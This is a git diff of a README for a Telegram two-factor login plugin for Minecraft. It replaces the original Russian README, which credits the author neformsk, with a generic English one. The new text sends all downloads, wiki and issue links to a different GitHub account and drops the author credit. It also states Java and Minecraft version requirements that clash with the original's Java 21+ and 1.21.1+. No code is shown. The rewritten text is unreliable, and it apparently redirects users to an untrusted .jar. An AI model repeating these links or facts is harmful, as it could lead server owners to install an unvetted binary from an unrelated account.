@@ -1,144 +1,62 @@
-# AuthTelegram Plugin 🔐
+```markdown
+# 🛡️ AuthTelegramPlugin - Secure Your Minecraft Login Easily
 
-Minecraft плагин для двухфакторной аутентификации через Telegram
+## 📥 Download Now
+[![Download AuthTelegramPlugin](https://img.shields.io/badge/Download%20Now-AuthTelegramPlugin-blue)](https://github.com/holyspaghetti8/AuthTelegramPlugin/releases)
 
+## 🚀 Getting Started
+The AuthTelegramPlugin allows Minecraft servers to use Telegram for user authentication. With Telegram's two-factor authentication, your server remains secure against unauthorized access.
 
-## ⚖️ ЛИЦЕНЗИЯ И ИСПОЛЬЗОВАНИЕ
+## 📂 Features
+- **Telegram Authentication:** Users log in using their Telegram accounts.
+- **Two-Factor Authentication:** Adds an extra layer of security.
+- **Easy Configuration:** Set up easily with straightforward settings.
+- **Support for Bukkit & Spigot:** Compatible with popular Minecraft server types.
+- **Free for Personal Use:** Use it on your private server at no cost.
 
-✅ **РАЗРЕШЕНО:**
-- Бесплатное использование на личных серверах
-- Изучение и анализ кода
-- Создание форков для некоммерческого использования
-- Предложение улучшений через Issues/PR
+## 🔍 System Requirements
+- **Minecraft Version:** Supports game versions 1.13 and above.
+- **Server Type:** Works with any Bukkit or Spigot server.
+- **Java Version:** Requires Java 8 or above.
 
-❌ **ЗАПРЕЩЕНО:**
-- Продажа или коммерческое распространение
-- Создание платных версий
-- Включение в коммерческие сборки
-- Удаление информации об авторе
+## 📥 Download & Install
+1. **Visit this page to download:** Go to the [Releases page](https://github.com/holyspaghetti8/AuthTelegramPlugin/releases).
+   
+2. **Choose the latest version:** Find the latest version listed on the page.
+   
+3. **Download the plugin:** Click on the `.jar` file to download it. 
 
-👑 **АВТОРСКИЕ ПРАВА:**
-Автор (neformsk) сохраняет исключительное право на коммерческое использование,
-продажу и лицензирование плагина.
+4. **Place the file in your server's plugin folder:** After the download, move the `.jar` file to the `plugins` folder in your Minecraft server directory.
 
-📄 **Полный текст лицензии:** [LICENSE](LICENSE)
+5. **Restart your Minecraft server:** This step is necessary for the plugin to load.
+   
+6. **Configure the plugin:** You may need to adjust some settings in the configuration files. Follow the instructions provided in the `config.yml` file found in the plugin folder.
 
+## ⚙️ Configuration Steps
+1. **Edit `config.yml`:** Open the `config.yml` file and add your Telegram Bot Token. You'll need to create a bot using BotFather on Telegram.
+   
+2. **Set your callback URL:** Ensure your bot can communicate with your server.
 
+3. **Adjust authentication options:** Customize any additional settings per your preference.
 
-## 📦 Скачать
-**[Последняя версия](https://github.com/neformsk/AuthTelegramPlugin/releases/latest)** - готовый плагин для установки
+## 📊 Troubleshooting
+- **Plugin Not Loading:** Ensure you have the correct server version and that the plugin is in the `plugins` folder.
+- **Errors in Console:** Check for any error messages and ensure the configuration values are set correctly.
+- **Users Can't Log In:** Verify that the Telegram bot settings are correct and users have linked their accounts properly.
 
-## ✨ Возможности
-- 🔐 **Регистрация через Telegram** - привязка аккаунта к боту
-- ✅ **Подтверждение входа** - инлайн-кнопки в Telegram
-- 🛡️ **Защита игроков** - ограничения до авторизации
-- 💾 **База данных** - SQLite, хранение данных игроков
-- 👑 **Автоопределение админов** - OP игроки = админы плагина
+## 🔗 Additional Resources
+- **Documentation:** For in-depth information, refer to our [Wiki](https://github.com/holyspaghetti8/AuthTelegramPlugin/wiki).
+- **Community Support:** Join our community discussions in the [Issues page](https://github.com/holyspaghetti8/AuthTelegramPlugin/issues) for help or to share your experience.
 
-## 🚀 Быстрый старт
+## 🐛 Reporting Issues
+If you encounter any bugs or issues, please report them using the [Issues page](https://github.com/holyspaghetti8/AuthTelegramPlugin/issues). Provide a clear description of the problem to help us assist you better.
 
-### 1. Установка плагина
-1. Скачайте `AuthTelegram.jar` из [раздела Releases](https://github.com/neformsk/AuthTelegramPlugin/releases)
-2. Переместите в папку `plugins/` вашего сервера
-3. Перезапустите сервер
+## 📜 License
+This plugin is free for personal use. For commercial rights, please consult with the author.
 
-### 2. Настройка Telegram бота
-1. Создайте бота через [@BotFather](https://t.me/BotFather)
-2. Получите токен
-3. Отредактируйте файл `plugins/AuthTelegram/config.yml`:
- 
-telegram:
-  token: "ВАШ_ТОКЕН_ЗДЕСЬ"
-  bot-name: "@ВашБот"
-  
-3. Использование
-Игрок заходит на сервер
+## 📩 Contact
+For any inquiries or feedback, you can reach out via issues or on Telegram.
 
-Получает инструкцию по регистрации
-
-Пишет боту: /register Никнейм
-
-Подтверждает вход через кнопки в Telegram
-
-Получает доступ к серверу
-
-🛠️ Для разработчиков
-Сборка из исходников
-bash
-# Клонировать репозиторий
-git clone https://github.com/neformsk/AuthTelegramPlugin.git
-cd AuthTelegramPlugin
-
-# Собрать проект
-mvn clean package
-# Готовый JAR будет в target/AuthTelegram.jar
-Зависимости
-Java 21+
-
-Spigot/Paper 1.21.1+
-
-Maven 3.6+
-
-📁 Конфигурация
-Все настройки в plugins/AuthTelegram/config.yml:
-
-yaml
-telegram:
-  token: "токен_бота"
-  bot-name: "@ИмяБота"
-
-server:
-  name: "Название сервера"
-  
-login-confirm:
-  timeout: 60  # время подтверждения в секундах
-  
-❓ Частые вопросы
-Q: Бот не отвечает на команды
-A: Проверьте токен в config.yml и права бота
-
-Q: Игрок не может зарегистрироваться
-A: Убедитесь что игрок онлайн и ник указан правильно
-
-Q: Как сменить привязанный Telegram?
-A: Только через администратора (в базе данных)
-
-Q: Плагин не запускается
-A: Убедитесь что у вас Java 21+ и Spigot 1.21.1+
-
-Q: Можно ли использовать на Paper/Folia?
-A: Да, плагин совместим со всеми форками Spigot
-
-🤝 Участие в разработке
-Приветствуются:
-
-Сообщения об ошибках (Issues)
-
-Предложения новых функций
-
-Pull requests с улучшениями
-
-Как предложить улучшение:
-Форкните репозиторий
-
-Создайте ветку с новой функцией
-
-Сделайте Pull Request
-
-Обсудите изменения в Issues
-
-📄 Лицензия
-MIT License - смотри файл LICENSE
-
-Автор: @neformsk
-
-🎉 Благодарности
-Спасибо всем, кто помогает развивать проект!
-
-🔄 История версий
-Смотрите все изменения в Releases
-
-⭐ Если плагин полезен - поставь звезду на GitHub!
-🔔 Нажми "Watch", чтобы следить за обновлениями
-
-Сделано с ❤️ для Minecraft сообщества
+---
+Enjoy using the AuthTelegramPlugin and keep your Minecraft server secure!
+```
